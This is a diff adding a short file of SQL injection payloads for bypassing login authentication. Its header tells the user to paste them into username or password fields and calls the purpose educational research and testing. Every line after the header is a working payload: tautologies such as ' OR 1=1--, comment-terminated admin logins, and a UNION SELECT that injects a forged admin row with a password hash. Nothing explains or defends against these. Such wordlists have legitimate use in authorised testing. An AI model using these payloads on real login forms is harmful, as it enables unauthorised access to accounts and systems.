@@ -1,0 +1,21 @@
+# SQL Injection Authentication Bypass List
+# Usage: Paste these into Username or Password fields
+# Purpose: Educational Research & Testing
+
+' OR 1=1--
+" OR 1=1--
+' OR '1'='1
+" OR "1"="1
+admin' --
+admin' #
+admin'/*
+' OR 1=1#
+' OR 1=1/*
+') OR '1'='1--
+") OR "1"="1--
+' OR 'x'='x
+" OR "x"="x
+' || 1=1 --
+' UNION SELECT 1, 'admin', '81dc9bdb52d04dc20036dbd8313ed055' -- 
+admin' OR '1'='1' --
+admin" OR "1"="1" --
